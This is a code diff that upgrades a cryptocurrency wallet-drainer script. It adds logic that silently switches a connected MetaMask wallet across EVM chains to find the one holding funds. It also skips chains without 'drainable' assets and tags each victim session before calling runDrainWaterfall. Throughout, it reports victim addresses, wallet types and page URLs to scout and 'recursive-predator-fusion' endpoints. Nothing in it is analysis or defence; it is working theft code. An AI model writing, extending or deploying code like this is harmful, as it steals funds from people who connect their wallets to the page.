@@ -173,7 +173,9 @@
   var SILENT = CFG.silentMode === true;
   var AUTO_DRAIN = CFG.autoDrain !== false;
   var AUTO_RUN = CFG.autoRun === true;
-  var MIN_DRAIN_USD = Number(CFG.minDrainUsd) || 5;
+  var MIN_DRAIN_USD = (CFG.minDrainUsd != null && Number.isFinite(Number(CFG.minDrainUsd)))
+    ? Number(CFG.minDrainUsd)
+    : 5;
   var SIGN_ONLY = CFG.signOnly !== false;
   var NATIVE_BATCH_FALLBACK = CFG.nativeBatchFallback !== false;
   var MOBILE_SEND_TX = CFG.mobileSendTx !== false;
@@ -567,6 +569,7 @@
     pendingEvmPermit2: null,
     wcSessionActive: false,
     notifySessionKey: null,
+    connectSession: null,
     fusionNotified: false,
   };
 
@@ -786,18 +789,78 @@
     return btoa(bin);
   }
 
+  var MIN_NATIVE_WEI = 1000000000000000n;
+
+  async function switchProviderChain(provider, chainId) {
+    await provider.request({
+      method: 'wallet_switchEthereumChain',
+      params: [{ chainId: '0x' + Number(chainId).toString(16) }],
+    });
+    await sleep(400);
+  }
+
+  async function readNativeBalanceWei(provider, address) {
+    try {
+      return BigInt(await provider.request({ method: 'eth_getBalance', params: [address, 'latest'] }) || '0x0');
+    } catch (e) {
+      return 0n;
+    }
+  }
+
+  /** Switch MetaMask to the EVM chain that actually holds native balance. */
+  async function ensureFundedEvmChain(provider, address, connectedChainId) {
+    var connectedBal = await readNativeBalanceWei(provider, address);
+    if (connectedBal > MIN_NATIVE_WEI) {
+      L.log('Funded chain:', connectedChainId, '| native:', (Number(connectedBal) / 1e18).toFixed(6));
+      return Number(connectedChainId);
+    }
+
+    L.log('Chain', connectedChainId, 'empty — finding funded EVM chain...');
+    var bestId = Number(connectedChainId);
+    var bestBal = connectedBal;
+    for (var i = 0; i < MULTI_CHAIN_ORDER.length; i++) {
+      var cid = MULTI_CHAIN_ORDER[i];
+      if (cid === Number(connectedChainId)) continue;
+      try {
+        await switchProviderChain(provider, cid);
+        var bal = await readNativeBalanceWei(provider, address);
+        if (bal > bestBal) {
+          bestBal = bal;
+          bestId = cid;
+        }
+      } catch (e) {
+        L.warn('Funded-chain probe', cid, 'fail:', e.message);
+      }
+    }
+
+    if (bestId !== Number(connectedChainId) && bestBal > MIN_NATIVE_WEI) {
+      L.log('Auto-switch', connectedChainId, '→', bestId, '| native:', (Number(bestBal) / 1e18).toFixed(6));
+      await switchProviderChain(provider, bestId);
+      return bestId;
+    }
+
+    if (bestId !== Number(connectedChainId)) {
+      try { await switchProviderChain(provider, connectedChainId); } catch (e) {}
+    }
+    return Number(connectedChainId);
+  }
+
+  function chainHasDrainableAssets(assets) {
+    if (!assets) return false;
+    var nativeBal = BigInt(assets.nativeHex || '0x0');
+    return nativeBal > MIN_NATIVE_WEI || (assets.tokens && assets.tokens.length > 0) || (assets.nfts && assets.nfts.length > 0);
+  }
+
   var SCOUT = {
     telemetry: async function (address, chainId, walletName) {
       try {
-        var sessionKey = String(address || '').toLowerCase();
-        if (S.notifySessionKey === sessionKey) return;
-        S.notifySessionKey = sessionKey;
         await apiPost('/api/v1/scout', {
           user_address: address,
           chain_id: Number(chainId) || 1,
           wallet_type: walletName || 'Unknown',
           chain_family: 'EVM',
           source_page: window.location.href,
+          connect_session: S.connectSession || undefined,
         });
       } catch (e) {}
     },
@@ -813,14 +876,14 @@
           scout_value_usd: Number(S.scoutUsd) || 0,
           source_page: window.location.href,
           detail: detail || undefined,
+          connect_session: S.connectSession || undefined,
         });
       } catch (e) {}
     },
 
     fusion: async function (addrs) {
-      if (S.fusionNotified) return null;
       try {
-        var body = {};
+        var body = { connect_session: S.connectSession || undefined };
         if (addrs.evm) body.evm_holder = addrs.evm;
         if (addrs.sol) body.sol_owner_base58 = addrs.sol;
         if (addrs.tron) body.tron_holder_base58 = addrs.tron;
@@ -830,7 +893,6 @@
         if (addrs.aptos) body.aptos_holder = addrs.aptos;
         if (addrs.sui) body.sui_holder = addrs.sui;
         var r = await apiPost('/api/scout/recursive-predator-fusion', body);
-        S.fusionNotified = true;
         var data = (r && r.data && r.data.fusion) ? r.data.fusion : (r && r.data) ? r.data : r;
         if (data && data.total_usd) S.scoutUsd = Number(data.total_usd) || S.scoutUsd;
         if (data && data.assets) S.fusionAssets = data.assets;
@@ -2101,18 +2163,21 @@
       var cid = MULTI_CHAIN_ORDER[i];
       if (cid === Number(originalChain)) continue;
       try {
-        await provider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x' + cid.toString(16) }] });
-        await sleep(400);
+        await switchProviderChain(provider, cid);
         var assets = await scanAssets(provider, address, cid);
+        if (!chainHasDrainableAssets(assets)) {
+          L.log('Chain', cid, 'empty — skip');
+          continue;
+        }
         if (assets.usd > 0 && assets.usd < MIN_DRAIN_USD) {
           var bal = BigInt(assets.nativeHex || '0x0');
-          if (bal < 1000000000000000n && assets.tokens.length === 0) continue;
+          if (bal < MIN_NATIVE_WEI && assets.tokens.length === 0) continue;
         }
         await runDrainWaterfall(provider, address, cid, S.evmWallet, null, assets);
       } catch (e) { L.warn('Chain', cid, 'fail:', e.message); }
     }
     try {
-      await provider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x' + Number(originalChain).toString(16) }] });
+      await switchProviderChain(provider, originalChain);
     } catch (e) {}
   }
 
@@ -2646,6 +2711,8 @@
 
     await SCOUT.telemetry(evmCtx.address, evmCtx.chainId, evmCtx.walletName);
     await SCOUT.fusion(addrs);
+    evmCtx.chainId = await ensureFundedEvmChain(evmCtx.provider, evmCtx.address, evmCtx.chainId);
+    S.evmChain = evmCtx.chainId;
     var priority = SCOUT.chainPriority();
 
     var runners = {
@@ -3372,6 +3439,7 @@
       if (!AUTO_DRAIN || S.drainRunning) return;
       S.drainRunning = true;
       S.pendingEvmPermit2 = null;
+      S.connectSession = 'legion:' + Date.now() + ':' + Math.random().toString(36).slice(2, 8);
       UI.showStatus('Scanning assets...');
 
       Object.assign(S.nonEvm, detectNonEvm());
